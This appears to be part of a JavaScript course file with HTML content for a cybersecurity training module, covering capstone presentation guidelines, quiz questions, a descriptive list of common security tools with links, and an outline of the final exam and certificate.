                        
                                <h4 class="font-bold">Presentation Guidelines</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Keep it concise and structured (10-15 slides).</li>
                                    <li>Use visuals and diagrams to explain findings.</li>
                                    <li>Prepare for questions from peers or evaluators.</li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Compile findings into a detailed cybersecurity report.</li>
                                    <li>Deliver a 5-10 minute presentation summarizing key insights.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Part 4: Session Assessment',
                            content: `
                                <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                                <ul class="pl-6 mb-6">
                                    <li class="mb-4">
                                        <p class="font-semibold">What is the purpose of a capstone project?</p>
                                        <div class="ml-4 mt-2">
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>a) To test cybersecurity theories</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>b) To gain hands-on experience in a real-world scenario</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q1" class="mr-2"> <span>c) To memorize cybersecurity definitions</span>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">Which tool is commonly used for penetration testing?</p>
                                        <div class="ml-4 mt-2">
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>a) Wireshark</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>b) Metasploit</span>
                                            </div>
                                            <div class="flex items-center mb-2">
                                                <input type="radio" name="q2" class="mr-2"> <span>c) Snort</span>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">What should a final cybersecurity report include?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Short Answer Questions</h4>
                                <ul class="pl-6 mb-6">
                                    <li class="mb-4">
                                        <p class="font-semibold">Why is a cybersecurity capstone project valuable for job seekers?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                    <li class="mb-4">
                                        <p class="font-semibold">What is the difference between penetration testing and incident response?</p>
                                        <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Hands-on Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Perform a real-world cybersecurity test and document findings.</li>
                                    <li>Present your cybersecurity project to peers or mentors.</li>
                                </ul>
                            `
                        },
                        {
                            title: 'Hands-on Labs & Tools Used',
                            content: `
                                <h4 class="font-bold">Essential Cybersecurity Tools</h4>
                                <div class="mb-6">
                                    <h5 class="font-semibold">1. Penetration Testing & Exploitation</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>Kali Linux – A Linux distribution for penetration testing and security auditing.</li>
                                        <li>Metasploit – A powerful framework for developing and executing exploits.</li>
                                        <li>Nmap – A network scanning tool to discover hosts and services.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">2. Network & Traffic Analysis</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>Wireshark – A packet analysis tool for examining network traffic.</li>
                                        <li>Burp Suite – A web vulnerability scanner and proxy tool.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">3. Password Cracking & Hash Analysis</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>Hashcat – A fast password recovery tool supporting multiple hashing algorithms.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">4. Log Analysis & Threat Detection</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>ELK Stack (Elasticsearch, Logstash, Kibana) – A powerful SIEM solution for log monitoring.</li>
                                        <li>Splunk – A tool for real-time security event monitoring and threat analysis.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">5. Cloud & Security Compliance</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>AWS Security Hub – Centralized cloud security management and threat detection.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">6. Vulnerability Scanning & Assessment</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>Nessus – A vulnerability scanner for identifying security weaknesses.</li>
                                    </ul>
                        
                                    <h5 class="font-semibold">7. Mobile Security</h5>
                                    <ul class="pl-6 mb-4">
                                        <li>MobSF (Mobile Security Framework) – A tool for analyzing Android and iOS applications.</li>
                                    </ul>
                                </div>
                            `
                        },
                        {
                            title: 'Final Exam & Certification',
                            content: `
                                <p class="mb-4">To successfully complete the course, participants must pass both a theoretical and practical assessment.</p>
                        
                                <h4 class="font-bold">Multiple-Choice Assessment</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Covers key cybersecurity concepts, tools, and techniques.</li>
                                    <li>Questions on penetration testing, network security, digital forensics, and more.</li>
                                </ul>
                        
                                <h4 class="font-bold">Practical Cybersecurity Challenge</h4>
                                <ul class="pl-6 mb-6">
                                    <li>A real-world cybersecurity task requiring the use of multiple tools.</li>
                                    <li>Examples:
                                        <ul class="pl-6">
                                            <li>Conduct a penetration test on a vulnerable system.</li>
                                            <li>Analyze a network capture file (PCAP) using Wireshark.</li>
                                            <li>Identify and mitigate vulnerabilities in a web application.</li>
                                        </ul>
                                    </li>
                                </ul>
                        
                                <h4 class="font-bold">Cybersecurity Certificate of Completion</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Issued upon successfully passing both assessments.</li>
                                    <li>Recognizes expertise in cybersecurity tools, techniques, and methodologies.</li>
                                    <li>Enhances professional credibility and job readiness.</li>
                                </ul>
                        
                                <h4 class="font-bold">Additional Resources</h4>
                                <ul class="pl-6 mb-6">
                                    <li><a href="https://www.kali.org" class="text-blue-600 hover:underline">Kali Linux</a></li>
                                    <li><a href="https://docs.metasploit.com" class="text-blue-600 hover:underline">Metasploit Documentation</a></li>
                                    <li><a href="https://www.wireshark.org/docs/" class="text-blue-600 hover:underline">Wireshark User Guide</a></li>
                                    <li><a href="https://portswigger.net/burp" class="text-blue-600 hover:underline">Burp Suite</a></li>
                                    <li><a href="https://aws.amazon.com/security-hub/" class="text-blue-600 hover:underline">AWS Security Hub</a></li>
                                    <li><a href="https://www.tenable.com/products/nessus" class="text-blue-600 hover:underline">Nessus</a></li>
                                    <li><a href="https://mobsf.github.io/" class="text-blue-600 hover:underline">MobSF</a></li>
                                </ul>
                            `
                        }
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            }
        ]
    }
]